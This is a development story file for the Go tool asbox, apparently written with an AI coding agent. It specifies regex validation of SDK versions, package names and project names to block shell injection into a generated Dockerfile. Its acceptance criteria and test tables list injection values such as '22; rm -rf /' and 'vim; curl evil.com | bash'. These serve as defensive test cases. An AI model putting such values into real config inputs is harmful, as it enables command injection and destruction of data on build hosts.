# Story 11.2: SDK, Package, and Project Name Sanitization

Status: done

## Story

As a developer,
I want asbox to validate SDK versions, package names, and project names in my config,
so that malformed or malicious values cannot inject shell commands into the generated Dockerfile.

## Acceptance Criteria

1. **Given** a config.yaml with an SDK version containing shell metacharacters (e.g., `nodejs: "22; rm -rf /"`)
   **When** asbox parses the config via `config.Parse()`
   **Then** the CLI exits with code 1 and prints an error identifying the invalid SDK version and the allowed character set

2. **Given** a config.yaml with a valid SDK version (e.g., `nodejs: "22"`, `python: "3.12"`, `go: "1.23.1"`)
   **When** asbox parses the config
   **Then** the version is accepted -- allowed characters: digits, letters, dots, hyphens, plus signs (semver-compatible)

3. **Given** a config.yaml with a package name containing shell metacharacters (e.g., `packages: ["vim; curl evil.com | bash"]`)
   **When** asbox parses the config
   **Then** the CLI exits with code 1 and prints an error identifying the invalid package name

4. **Given** a config.yaml with an empty string in the packages list (e.g., `packages: ["", "vim"]`)
   **When** asbox parses the config
   **Then** the CLI exits with code 1 and prints an error rejecting empty package names

5. **Given** a config.yaml with valid package names (e.g., `packages: ["vim", "build-essential", "libpq-dev"]`)
   **When** asbox parses the config
   **Then** all package names are accepted -- allowed characters: alphanumeric, hyphens, dots, plus signs, colons (apt package name format)

6. **Given** a config.yaml with `project_name: "My_Project; rm -rf /"` (explicitly set, not derived)
   **When** asbox parses the config
   **Then** the explicit `project_name` is sanitized through the same `sanitizeProjectName()` logic as derived names, producing a safe `[a-z0-9-]` name

## Tasks / Subtasks

- [x] Task 1: Add `validateSDKVersion()` function (AC: #1, #2)
  - [x] 1.1 Create regex `^[0-9a-zA-Z.\-+]+$` for semver-compatible charset
  - [x] 1.2 Return `*ConfigError` with field name (e.g., `sdks.nodejs`) and allowed charset in message
  - [x] 1.3 Call from `Parse()` for each non-empty SDK field (NodeJS, Go, Python)
- [x] Task 2: Add `validatePackageName()` function (AC: #3, #4, #5)
  - [x] 2.1 Create regex `^[a-zA-Z0-9][a-zA-Z0-9.\-+:]*$` for apt package name format
  - [x] 2.2 Reject empty strings explicitly before regex check
  - [x] 2.3 Return `*ConfigError` with field name (e.g., `packages[0]`) and allowed format in message
  - [x] 2.4 Call from `Parse()` looping over `cfg.Packages`
- [x] Task 3: Apply `sanitizeProjectName()` to explicit `project_name` values (AC: #6)
  - [x] 3.1 Move `sanitizeProjectName()` call to run on `cfg.ProjectName` AFTER derivation block, covering both explicit and derived names
  - [x] 3.2 Keep fallback to `"asbox"` when sanitization produces empty string
- [x] Task 4: Add unit tests in `internal/config/parse_test.go` (AC: all)
  - [x] 4.1 Table-driven test for `validateSDKVersion` (valid semver, metacharacters, empty-ish patterns)
  - [x] 4.2 Table-driven test for `validatePackageName` (valid apt names, metacharacters, empty strings, colon epoch)
  - [x] 4.3 Test explicit `project_name` sanitization (uppercase, underscores, metacharacters become sanitized)
  - [x] 4.4 Verify existing tests still pass (derived project name, full config, minimal config)

## Dev Notes

### Implementation Location

All changes in `internal/config/parse.go` and `internal/config/parse_test.go`. No new files, no new error types, no new exit codes.

### Validation Functions

**`validateSDKVersion(field, version string) error`**

Add after the existing `sanitizeProjectName` function (line 212 of `internal/config/parse.go`):

- Regex: `^[0-9a-zA-Z.\-+]+$` -- compile as package-level `var` like existing `sanitizeRe` (line 21)
- Return `&ConfigError{Field: field, Msg: ...}` on failure
- Error message format: `"contains invalid characters %q. Allowed: letters, digits, dots, hyphens, plus signs"` including the bad value
- Call site: in `Parse()`, after YAML unmarshal (line 43), before mount validation (line 119). Check each non-empty SDK field:
  - `cfg.SDKs.NodeJS` with field `"sdks.nodejs"`
  - `cfg.SDKs.Go` with field `"sdks.go"`
  - `cfg.SDKs.Python` with field `"sdks.python"`

**`validatePackageName(index int, pkg string) error`**

- Check empty string first: `if pkg == ""` return error with field `fmt.Sprintf("packages[%d]", index)` and message `"empty package name is not allowed"`
- Regex: `^[a-zA-Z0-9][a-zA-Z0-9.\-+:]*$` -- compile as package-level `var`
- Return `&ConfigError{Field: fmt.Sprintf("packages[%d]", index), Msg: ...}` on failure
- Error message: `"contains invalid characters %q. Allowed: alphanumeric, hyphens, dots, plus signs, colons (apt format)"` including the bad value
- Call site: in `Parse()`, loop over `cfg.Packages` with index. Place after SDK validation, before mount validation.

**Project name sanitization fix:**

Current code at lines 148-157 only sanitizes when `cfg.ProjectName == ""`. Change to ALWAYS sanitize:

```go
if cfg.ProjectName == "" {
    parentDir := filepath.Dir(configDir)
    cfg.ProjectName = sanitizeProjectName(filepath.Base(parentDir))
} else {
    cfg.ProjectName = sanitizeProjectName(cfg.ProjectName)
}
if cfg.ProjectName == "" {
    cfg.ProjectName = "asbox"
}
```

This ensures explicit names like `"My_Project"` become `"my-project"`, matching the `[a-z0-9-]` charset expected by container name pattern `^asbox-[a-z0-9-]+-[0-9a-f]{6}$` in `cmd/run_test.go:199-206`.

### Injection Points Protected

These validated values flow to:

1. **Dockerfile ARG/RUN** (`embed/Dockerfile.tmpl`):
   - Line 22: `ARG NODE_VERSION={{.SDKs.NodeJS}}` -> used in `curl ... setup_${NODE_VERSION}.x | bash -`
   - Line 33: `ARG GO_VERSION={{.SDKs.Go}}` -> used in `curl ... go${GO_VERSION}.linux-... | tar -C ...`
   - Line 39: `ARG PYTHON_VERSION={{.SDKs.Python}}` -> used in `apt-get install -y python${PYTHON_VERSION}`
   - Lines 53-56: `{{$pkg}} \` in `apt-get install -y` loop
   - Lines 130-131: `ENV {{$k}}="{{$v}}"` (deferred to story 11-3)

2. **Docker build args** (`internal/docker/build.go:108-122`):
   - `--build-arg NODE_VERSION=` + `cfg.SDKs.NodeJS`
   - `--build-arg GO_VERSION=` + `cfg.SDKs.Go`
   - `--build-arg PYTHON_VERSION=` + `cfg.SDKs.Python`

3. **Docker image tags** (`cmd/build_helper.go:40-41`):
   - `asbox-<ProjectName>:<hash>` and `asbox-<ProjectName>:latest`

4. **Container names** (`cmd/run.go:126`):
   - `asbox-<ProjectName>-<randomSuffix>`

### Validation Timing

All validation MUST happen in `Parse()` BEFORE any downstream consumer sees values. The architecture principle: template rendering (`internal/template/render.go`) assumes fully validated input.

### Error Pattern

Follow existing `ConfigError` pattern in `internal/config/errors.go`:
- No new error types needed -- reuse `ConfigError`
- No new exit codes needed -- config errors already map to exit 1 in `cmd/root.go:54,66`
- No changes needed to `cmd/root_test.go:TestExitCode_mapping` table
- Error messages MUST include: what failed, why (the bad value), fix action (allowed charset)

### Regex Placement

Add as package-level compiled regexps (like existing `sanitizeRe` at line 21):

```go
var sdkVersionRe   = regexp.MustCompile(`^[0-9a-zA-Z.\-+]+$`)
var packageNameRe  = regexp.MustCompile(`^[a-zA-Z0-9][a-zA-Z0-9.\-+:]*$`)
```

### Validation Order in Parse()

Insert after agent/MCP validation (line 117) and before mount validation (line 119):

1. Validate SDK versions (NodeJS, Go, Python)
2. Validate package names
3. Sanitize project name (modify existing block at lines 148-157)

### Project Structure Notes

- All changes in `internal/config/` -- no new packages, no cross-package changes
- No changes to `cmd/` layer, `embed/`, `internal/docker/`, `internal/template/`, or `internal/mount/`
- The `sanitizeProjectName()` function already exists at `internal/config/parse.go:205-212` -- reuse it, don't recreate
- Existing package-level regex vars at lines 21-22 establish the pattern for new regex vars

### Testing Strategy

Use table-driven tests following existing patterns in `internal/config/parse_test.go`.

**SDK Version Tests** -- new function `TestParse_sdkVersionValidation`:

| SDK Field | Value | Expected |
|-----------|-------|----------|
| `sdks.nodejs` | `"22"` | accept |
| `sdks.nodejs` | `"22.13.0"` | accept |
| `sdks.go` | `"1.23.1"` | accept |
| `sdks.python` | `"3.12"` | accept |
| `sdks.nodejs` | `"22-rc1"` | accept |
| `sdks.go` | `"1.23+build.1"` | accept |
| `sdks.nodejs` | `"22; rm -rf /"` | reject, ConfigError field=`sdks.nodejs` |
| `sdks.go` | `"1.23$(curl evil)"` | reject, ConfigError field=`sdks.go` |
| `sdks.python` | `"3.12\nRUN evil"` | reject, ConfigError field=`sdks.python` |
| `sdks.nodejs` | `"22 "` | reject (space) |

**Package Name Tests** -- new function `TestParse_packageNameValidation`:

| Value | Expected |
|-------|----------|
| `"vim"` | accept |
| `"build-essential"` | accept |
| `"libpq-dev"` | accept |
| `"python3.12-venv"` | accept |
| `"lib++-dev"` | accept (plus sign) |
| `"5:vim"` | accept (colon for epoch) |
| `""` | reject, ConfigError field=`packages[0]` |
| `"vim; curl evil"` | reject |
| `"-invalid"` | reject (starts with hyphen) |
| `".invalid"` | reject (starts with dot) |

**Project Name Sanitization Tests** -- new function `TestParse_explicitProjectNameSanitized`:

| Explicit Name | Expected After Sanitization |
|---------------|-----------------------------|
| `"my-project"` | `"my-project"` (unchanged) |
| `"My_Project"` | `"my-project"` |
| `"PROJECT 123!"` | `"project-123"` |
| `"---leading---"` | `"leading"` |
| `"!!!"` | `"asbox"` (fallback) |

Test structure: use existing `writeConfig()` helper and `errors.As(*ConfigError)` assertion pattern.

### Previous Story Intelligence (11-1)

**Key learnings from story 11-1:**
- Container names use pattern `asbox-<project>-<6-char-hex>` (line 126 of `cmd/run.go`)
- Test at `cmd/run_test.go:199-206` asserts pattern `^asbox-[a-z0-9-]+-[0-9a-f]{6}$` -- this ASSUMES project names only contain `[a-z0-9-]`, which is exactly what story 11-2 must enforce
- Deferred work item explicitly states: "Project names with uppercase/underscores not validated -- cfg.ProjectName can contain characters outside the [a-z0-9-] charset. Story 11-2 will address."
- No new files were created in 11-1 -- all changes in existing files. Same pattern applies here.
- `crypto/rand` used for suffix, not `math/rand` -- irrelevant to 11-2 but shows stdlib-only preference

**Git patterns from recent commits:**
- Commit `5775826`: story 11-1 modified `cmd/run.go`, `cmd/run_test.go`, `internal/docker/run_test.go`, `integration/lifecycle_test.go`
- Convention: `feat:` prefix for new features, `fix:` for corrections, `test:` for test-only changes
- This story is validation (not a new feature) so commit prefix should be `fix:` or `feat:` depending on whether it's framed as a security fix or new capability

### Deferred Work Items Resolved

This story resolves the following items from `_bmad-output/implementation-artifacts/deferred-work.md`:
- "SDK version string injection" (line 11)
- "Package name injection" (line 12)
- "Unsanitized explicit `project_name`" (line 16)
- "Project names with uppercase/underscores not validated" (line 59)

Partially addresses:
- "Template injection via unsanitized config inputs" (line 14) -- SDK/package/project inputs sanitized; ENV key/value deferred to story 11-3

### What NOT To Change

- `embed/Dockerfile.tmpl` -- template assumes validated input; no escaping logic needed there
- `internal/docker/build.go` -- `BuildArgs()` passes values via `os/exec` args array (not shell string), safe by construction
- `cmd/root.go` / `cmd/root_test.go` -- no new error types or exit codes needed
- `internal/config/errors.go` -- reuse existing `ConfigError`; no new types
- `cmd/run.go` -- container naming logic already correct IF project name is sanitized
- `cmd/run_test.go` -- existing `TestRunContainerNameMatchesPattern` pattern will pass once project names are clean

### References

- [Source: _bmad-output/planning-artifacts/epics.md - Epic 11, Story 11-2]
- [Source: _bmad-output/planning-artifacts/architecture.md - Config Validation, Security Model]
- [Source: _bmad-output/implementation-artifacts/deferred-work.md - Security/Input Validation section]
- [Source: _bmad-output/implementation-artifacts/11-1-concurrent-sandbox-sessions.md - Previous story learnings]
- [Source: internal/config/parse.go - Parse(), sanitizeProjectName(), lines 24-212]
- [Source: internal/config/config.go - Config struct, SDKConfig struct, lines 39-60]
- [Source: internal/config/errors.go - ConfigError type, lines 6-16]
- [Source: embed/Dockerfile.tmpl - SDK ARG/RUN injection points, lines 20-57]
- [Source: cmd/build_helper.go - Image tag construction, lines 40-41]
- [Source: cmd/run.go - Container name construction, line 126]
- [Source: internal/docker/build.go - BuildArgs(), lines 107-122]

## Dev Agent Record

### Agent Model Used

Codex GPT-5

### Implementation Plan

- Add parser-first tests for SDK versions, package names, and explicit `project_name` normalization.
- Validate SDK/package input during `Parse()` before any downstream template or Docker consumers see the values.
- Route both derived and explicit project names through `sanitizeProjectName()` with the existing `"asbox"` fallback.
- Run focused parser tests first, then full-project regression and `go vet`.

### Debug Log References

- Red: added table-driven tests for SDK version validation, package name validation, and explicit project name sanitization; confirmed the new negative cases failed before implementation.
- Green: added `sdkVersionRe`, `packageNameRe`, `validateSDKVersion()`, and `validatePackageName()` in `internal/config/parse.go`, and sanitized explicit `project_name` values through the existing `sanitizeProjectName()` flow.
- Validation: `go test ./internal/config -run 'TestParse_(sdkVersionValidation|packageNameValidation|explicitProjectNameSanitized)$'`, `go test ./...`, `go vet ./...`.

### Completion Notes List

- Added config-parse validation for SDK versions using a semver-safe character whitelist and `ConfigError` field reporting for `sdks.nodejs`, `sdks.go`, and `sdks.python`.
- Added package-name validation for `packages[]`, including explicit empty-string rejection and apt-style character checks.
- Normalized explicit `project_name` values with the same sanitization path used for derived names, preserving the `"asbox"` fallback when sanitization removes all characters.
- Added table-driven unit coverage for valid and invalid SDK/package inputs plus explicit project-name sanitization cases; full Go test suite and `go vet` passed.

### Change Log

- 2026-04-16: Implemented SDK/package validation and explicit project name sanitization in `internal/config/parse.go`; added coverage in `internal/config/parse_test.go`.

### Review Findings

- [x] [Review][Patch] Apt version pinning with `=` rejected by package regex — expanded `packageNameRe` to include `=`; added `"version pinned"` test case. Fixed.
- [x] [Review][Patch] SDK validation uses map with nondeterministic iteration order — replaced map literal with slice of structs for stable error reporting. Fixed.
- [x] [Review][Defer] Apt release pinning with `/` rejected [internal/config/parse.go:23] — deferred, niche apt syntax (`vim/jammy-backports`); can be added if needed
- [x] [Review][Defer] Apt tilde `~` versions rejected [internal/config/parse.go:23] — deferred, valid Debian version char but uncommon in practice

### File List

- internal/config/parse.go (modified — added SDK/package validators and explicit project-name sanitization)
- internal/config/parse_test.go (modified — added table-driven validation and sanitization tests)
